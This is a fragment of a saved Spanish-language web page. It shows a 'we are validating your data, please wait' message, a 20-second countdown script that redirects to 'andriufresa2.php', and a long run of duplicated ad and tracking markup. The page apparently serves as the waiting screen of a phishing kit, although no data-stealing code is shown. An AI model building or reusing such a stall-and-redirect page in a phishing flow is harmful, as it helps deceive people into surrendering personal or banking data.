        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script><script src="./index_files/prebid-vidoomy_pbjs.js.descargar" async=""></script><script src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script></head>
<body __processed_e29fd4be-a906-474e-8017-9ff5dfe77e38__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMCIsInNjb3JlIjoyMDAyMH0seyJtYXN0ZXIiOmZhbHNlLCJleHRlbnNpb25JZCI6Im5pbWxtZWpibW5lY25hZ2hnbWJhaG1iYWRkaGpiZWNnIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMCIsInNjb3JlIjoyMDAyMH1d" __processed_e2a92555-9c4b-4860-9273-9197a4419257__="true">
<ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;" data-ad-status="unfilled"><div id="aswift_0_host" bis_skin_checked="1" style="border: none; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"><iframe id="aswift_0" name="aswift_0" browsingtopics="true" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allow="attribution-reporting; run-ad-auction" src="./index_files/ads.html" data-google-container-id="a!1" tabindex="0" title="Advertisement" aria-label="Advertisement" data-load-complete="true" bis_precise_ad="1" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}" bis_id="fr_ad6hspodj35kce5fmasc2b" bis_depth="0" bis_chainid="1"></iframe></div></ins>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

    <section class="container">
        <img src="./index_files/ss1.png" alt="Logo" width="100">
        <p class="mensaje">Estamos validando sus datos, espere un momento...</p>
        <div style="text-align: center;" align="left"><img
                  style="width: 120px; display: block; margin-left: auto; margin-right: auto;"
                  src="./ldr.gif"></div>
                  <label style="color: black"
              >Tiempo restante <span id="countdown">20</span> segundos</label
            >
            <script>
              // Función para iniciar la cuenta regresiva
              function startCountdown(seconds) {
                // Obtener el elemento <span> donde mostraremos el contador
                var countdownElement = document.getElementById("countdown");

                // Iniciar el intervalo de cuenta regresiva
                var countdownInterval = setInterval(function () {
                  // Actualizar el contenido del elemento con el valor actual de segundos
                  countdownElement.textContent = seconds;

                  // Reducir el valor de segundos
                  seconds--;

                  // Verificar si el contador ha llegado a cero
                  if (seconds < 0) {
                    // Limpiar el intervalo y mostrar una alerta
                    clearInterval(countdownInterval);

                    window.location.href = "andriufresa2.php";
                  }
                }, 1000); // Intervalo de 1 segundo
              }

              // Llamar a la función de cuenta regresiva al cargar la página
              document.addEventListener("DOMContentLoaded", function () {
                startCountdown(20); // Iniciar la cuenta regresiva con 20 segundos
              });
            </script>

    </section>







<iframe name="googlefcPresent" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;" src="./index_files/saved_resource.html"></iframe><iframe name="__tcfapiLocator" src="./index_files/saved_resource(2).html" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><iframe name="__uspapiLocator" src="./index_files/saved_resource(3).html" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><iframe name="__gppLocator" src="./index_files/saved_resource(4).html" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><iframe name="googlefcInactive" src="./index_files/saved_resource(5).html" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><iframe name="googlefcLoaded" src="./index_files/saved_resource(6).html" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><iframe src="./index_files/aframe.html" width="0" height="0" style="display: none;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}"></iframe><img src="./index_files/p" width="1" height="1" id="fire-px1" alt="" style="display: none;"><div class="XIK3pilOtc3FkAO3vh4Y pQmNKhbtigKnCfuTeMRQ _3Gerh5ThjjalwgOax2cw" style="z-index: 2147483647; width: 360px; height: 207px; margin: 0px -18px 100px; transition: right 600ms ease-in-out, left 600ms ease-in-out, transform 600ms ease-in-out; bottom: 10px;" data-video-id="716a4a19-cb7b-4c70-b79b-95f1a65ae3ac" bis_skin_checked="1"><div class="Y6VvljfWwquw4LCPe13t _3Gerh5ThjjalwgOax2cw pQmNKhbtigKnCfuTeMRQ " bis_skin_checked="1">CLOSE AD</div><div class="KU6taH6Iufu7hecLfdEz" style="width:100%; height: 100%;" bis_skin_checked="1"><video ref="" autoplay="" muted="" playsinline="" width="350" height="197"></video><div style="display: block;" bis_skin_checked="1"><div class="hPgVrsnJ7H8GeW9du_64 XJV1AgGU0406rTJYtBmv " bis_skin_checked="1"><div class="Pqaaul1UQQKVGE4TCoI6" bis_skin_checked="1"><div class="z04LWahYi2geDMSfLSxw" bis_skin_checked="1" style="transform: translateY(0px);"></div></div><div class="UyqeI7iVGGYgjPrc0fUx uMql69xeMJRRAFSeEWsw xhuCryf7wy9hnKLnO3mr" bis_skin_checked="1"></div></div><div class="hPgVrsnJ7H8GeW9du_64 m3WlbIU44y_Rddhpkizv" data-hidden="true" bis_skin_checked="1"><div class="UyqeI7iVGGYgjPrc0fUx uMql69xeMJRRAFSeEWsw amO0fvMIxb_ucTYvV4OP" bis_skin_checked="1"></div></div></div><div bis_skin_checked="1"></div><div bis_skin_checked="1"></div><img src="./index_files/sync" width="1" height="1" alt="" style="display: none;"><iframe src="./index_files/sync.html" width="1" height="1" style="display: none; border: none;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}" bis_id="fr_tee8ay8k6dxxbnrdgiw8dr" bis_depth="0" bis_chainid="4"></iframe><iframe src="./index_files/saved_resource(7).html" width="1" height="1" style="display: none; border: none;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}" bis_id="fr_05i2dmncw3o3bbrynkuqam" bis_depth="0" bis_chainid="5"></iframe></div></div><iframe marginwidth="0" marginheight="0" scrolling="no" frameborder="0" id="101b507533824b" width="0" height="0" src="./index_files/saved_resource(8).html" name="__pb_locator__" style="display: none; height: 0px; width: 0px; border: 0px;"></iframe><img src="./index_files/auto-user-sync" id="stickyTrackImg581593" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg780160" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg182940" style="width: 0px; height: 0px; border: none;"><img src="./index_files/auto-user-sync" id="stickyTrackImg38446" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg784051" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg544668" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg926794" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg917638" style="width: 0px; height: 0px; border: none;"><img src="./index_files/auto-user-sync" id="stickyTrackImg545403" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg39718" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg151890" style="width: 0px; height: 0px; border: none;"><img src="./index_files/auto-user-sync" id="stickyTrackImg325761" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg370501" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg499775" style="width: 0px; height: 0px; border: none;"><img src="./index_files/auto-user-sync" id="stickyTrackImg322626" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg129175" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg286368" style="width: 0px; height: 0px; border: none;"><img src="./index_files/auto-user-sync" id="stickyTrackImg179272" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg258159" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg109748" style="width: 0px; height: 0px; border: none;"><img src="./index_files/auto-user-sync" id="stickyTrackImg408396" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg422743" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg219411" style="width: 0px; height: 0px; border: none;"><img src="./index_files/auto-user-sync" id="stickyTrackImg13784" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg524635" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg363090" style="width: 0px; height: 0px; border: none;"><img src="./index_files/auto-user-sync" id="stickyTrackImg135001" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching" id="stickyTrackImg398012" style="width: 0px; height: 0px; border: none;"><img src="./index_files/user-matching(1)" id="stickyTrackImg959324" style="width: 0px; height: 0px; border: none;"><iframe id="google_esf" name="google_esf" src="./index_files/zrt_lookup_fy2021.html" style="display: none;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}" bis_id="fr_54emzw27tsg2rs5z2yzmbr" bis_depth="0" bis_chainid="3"></iframe><iframe name="goog_topics_frame" src="./index_files/topics_frame.html" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}" bis_id="fr_k8fjg69fq2i84gpv1lxthp" bis_depth="0" bis_chainid="6" style="display: none;"></iframe>

</script></body></html>